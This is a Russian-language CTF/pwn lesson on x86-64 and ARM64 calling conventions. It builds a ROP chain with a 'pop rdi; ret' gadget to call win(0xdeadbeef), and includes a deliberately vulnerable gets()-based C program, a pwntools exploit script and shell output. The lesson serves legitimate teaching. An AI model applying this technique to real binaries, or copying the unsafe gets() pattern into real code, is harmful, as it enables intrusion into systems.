## Вопрос, с которого всё начинается

Ты научился переполнять стек и возвращаться в нужную функцию. Но что, если функция принимает аргумент? Например, `win` открывает shell только если ей передали правильное число. Как «подсунуть» ей это число, если ты управляешь только адресом возврата?

Чтобы ответить, нужно понять, как функции вообще получают аргументы. Это описано в **соглашении о вызовах** (ABI) — договоре: какие регистры что переносят, кто сохраняет стек, как возвращается результат.

## Наш пример: бинарь с проверкой аргумента

Возьмём такой код:

```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>

void win(unsigned int x) {
    if (x == 0xdeadbeef)
        system("/bin/sh");   // откроется только при x == 0xdeadbeef
}

int main(void) {
    char buf[64];
    gets(buf);
    return 0;
}
```

```bash
$ gcc -fno-stack-protector -no-pie -o vuln vuln.c
```

Функция `win` ждёт один аргумент — число `0xdeadbeef`. Просто прыгнуть в `win` недостаточно: надо ещё положить это число туда, откуда `win` его прочитает.

## Шаг 1. Как процессор передаёт аргументы

На 64-битном x86 (System V AMD64) первые шесть аргументов функции передаются **не через стек, а через регистры** — так быстрее:

| Аргумент | Регистр |
|---|---|
| 1-й | `rdi` |
| 2-й | `rsi` |
| 3-й | `rdx` |
| 4-й | `rcx` |
| 5-й | `r8` |
| 6-й | `r9` |
| 7-й и дальше | стек |

Результат функция возвращает в `rax`. Запомнить проще всего через `rdi`: **«первый аргумент — в rdi»**. Увидел в дизассемблере `mov edi, 2` — значит передали число 2.

## Шаг 2. Читаем дизассемблер main

Посмотрим, как `main` вызывает `gets`:

```bash
$ objdump -d -M intel ./vuln | sed -n '/<main>:/,/ret/p'
```

```asm
4011c7 <main>:
  4011c7:  push   rbp
  4011c8:  mov    rbp, rsp
  4011cb:  sub    rsp, 0x40          ; выделили место под buf[64]
  4011cf:  lea    rax, [rbp-0x40]    ; rax = адрес buf
  4011d3:  mov    rdi, rax           ; первый аргумент gets = buf
  4011d6:  call   gets@plt
  4011db:  ...
  4011e0:  leave
  4011e1:  ret
```

Читается буквально: адрес буфера положили в `rdi`, потом вызвали `gets`. Функция `gets` «знает», что её первый аргумент — в `rdi`, потому что так договорились.

Ещё заметим: `sub rsp, 0x40` — это 64 байта под наш буфер. `leave` в конце восстанавливает `rbp` и `rsp`, а `ret` забирает со стека адрес возврата. Именно этот `ret` мы и перезаписывали в прошлом уроке.

## Шаг 3. Читаем win: где она берёт аргумент

```bash
$ objdump -d -M intel ./vuln | sed -n '/<win>:/,/ret/p'
```

```asm
4011a6 <win>:
  4011a6:  push   rbp
  4011a7:  mov    rbp, rsp
  4011aa:  cmp    edi, 0xdeadbeef    ; сравниваем ПЕРВЫЙ аргумент
  4011b0:  jne    4011c3             ; если не равен — на выход
  4011b2:  lea    rdi, [rip+...]     ; "/bin/sh"
  4011b9:  call   system@plt
  4011c3:  pop    rbp
  4011c4:  ret
```

Вот ответ: `win` читает своё число из `edi` (младшие 32 бита `rdi`). Значит, чтобы `win` открыла shell, к моменту входа в неё в `rdi` должно лежать `0xdeadbeef`.

Прыгнуть по адресу `win` мало — регистр `rdi` мы так не контролируем. Нужен способ записать в него нужное значение.

## Шаг 4. Гаджет pop rdi; ret

Вспомним: `ret` берёт со стека адрес и прыгает туда. А если найти в бинаре пару инструкций `pop rdi` + `ret`? `pop rdi` снимет со стека 8 байт и положит их в `rdi`, а следующий `ret` прыгнет дальше.

Такую маленькую последовательность инструкций называют **гаджетом** — «полезный кусочек кода, заканчивающийся на `ret`». Находим его в бинаре:

```bash
$ ROPgadget --binary ./vuln | grep "pop rdi ; ret"
0x000000000040123b : pop rdi ; ret
```

Теперь у нас есть инструмент: если поставить в стек `адрес_гаджета`, затем число `0xdeadbeef`, затем `адрес_win`, то произойдёт следующее:

1. `ret` прыгнет в гаджет;
2. `pop rdi` положит `0xdeadbeef` в `rdi`;
3. `ret` прыгнет в `win` — уже с нужным аргументом.

## Шаг 5. Собираем вызов win(0xdeadbeef)

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
OFFSET = 72
pop_rdi = 0x40123b
win = elf.symbols['win']

p = process('./vuln')
payload  = b'A' * OFFSET
payload += p64(pop_rdi)       # 1) прыжок в гаджет
payload += p64(0xdeadbeef)    # 2) это значение pop rdi снимет в rdi
payload += p64(win)           # 3) теперь ret прыгнет в win
p.sendline(payload)
p.interactive()
```

```bash
$ python3 exp.py
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

Shell открылся — значит, `rdi` действительно оказался равен `0xdeadbeef`.

## Шаг 6. То же самое на ARM64

На AArch64 (AAPCS64) аргументы тоже в регистрах, но имена другие: первые восемь — `x0`…`x7`. Первый аргумент, стало быть, в `x0`. Адрес возврата ARM64 хранит не на стеке, а в отдельном регистре `x30` (его зовут `lr`, link register), и по `ret` прыгает именно по нему.

| | x86-64 | ARM64 |
|---|---|---|
| 1-й аргумент | `rdi` | `x0` |
| 2-й аргумент | `rsi` | `x1` |
| результат | `rax` | `x0` |
| адрес возврата | на стеке | `x30`/`lr` |

Подробнее ARM64 разберём в отдельном уроке; пока важно, что идея та же — аргумент в регистр, а управление через адрес возврата.

## Шаг 7. Какие регистры функция обязана сохранить

Ещё одна часть договора — кто отвечает за сохранность регистров при вызове функции. Регистры делят на две группы:

- **caller-saved** (`rax`, `rcx`, `rdx`, `rsi`, `rdi`, `r8`–`r11`) — вызывающий сам заботится о них: если значение нужно после вызова, он его куда-то прячет. Вызываемая функция вольна их менять.
- **callee-saved** (`rbx`, `rbp`, `r12`–`r15`) — вызываемая функция обязана их сохранить и восстановить. Если она ими пользуется, то сначала кладёт их на стек, а перед `ret` возвращает.

Для pwn это важно вот почему. Аргументы (`rdi` и компания) — caller-saved, поэтому мы свободно переписываем их через гаджеты, и никто их не восстанавливает. А если ROP-цепочка затирает `rbx` или `r12`, которые нужны вызывающей функции, может произойти краш уже после нашей полезной работы. Поэтому в больших цепочках иногда добавляют сохранение/восстановление callee-saved регистров.

На ARM64 аналогично: `x0`–`x17` — caller-saved, `x19`–`x29` — callee-saved.

## Инструмент: nm — таблица символов

`nm` перечисляет символы бинарника: имена функций и глобальных переменных с их адресами. Если символы не срезаны, это самый быстрый способ найти нужную функцию.

Ключи, которые пригодятся:
* `nm <файл>` — все символы с адресами;
* `nm -C <файл>` — демутируй C++-имена (читаемые сигнатуры);
* `T`/`t` — код (глобальный/локальный), `R`/`r` — только чтение (`.rodata`), `D`/`B` — данные;
* нижний регистр = локальный символ, верхний = глобальный/экспортируемый.

### Рабочий пример (как в лаборатории)

```
$ nm add
0000000000403000 R __bss_start
0000000000403000 R _edata
0000000000403000 R _end
                 U _start
0000000000401000 T add
000000000040102e T main
000000000040101c T sub
```

Подсказка из лаборатории: `nm <файл> — таблица символов`.

## Что мы теперь знаем

- Первые шесть аргументов x86-64 передаются в `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`.
- Первый аргумент всегда в `rdi`; результат функции — в `rax`.
- Функция читает свой аргумент из регистра, а не «откуда-то сверху».
- Гаджет — короткий кусочек кода на `ret`; `pop rdi; ret` кладёт число из стека в `rdi`.
- Чтобы вызвать `win(0xdeadbeef)`, нужна цепочка: гаджет → число → адрес `win`.
- На ARM64 аргументы в `x0`…`x7`, а адрес возврата — в `x30`/`lr`.

## Куда дальше

Теперь мы умеем и возвращаться в функцию, и передавать ей аргументы. В следующем уроке (`pwn-methodology`) соберём из этих кубиков системный чек-лист: как подходить к незнакомой задаче, что смотреть в первую очередь и в каком порядке. Запомни главное: **аргументы живут в регистрах, и `pop rdi; ret` — самый частый способ записать в них нужное число.**

## Где пригодится

- **CTF Pwn:** понимание ABI — половина решения задач; без него не собрать ни одну ROP-цепочку.
- **Реверс-инжиниринг:** читая дизассемблер, ты сразу видишь, какие аргументы передаются и куда.
- **Разработка эксплойтов:** выбор гаджетов (`pop rdi`, `pop rsi`, `pop rdx`) диктуется ABI.
- **Embedded/IoT:** те же принципы для ARM/MIPS — нужно лишь знать имена регистров.
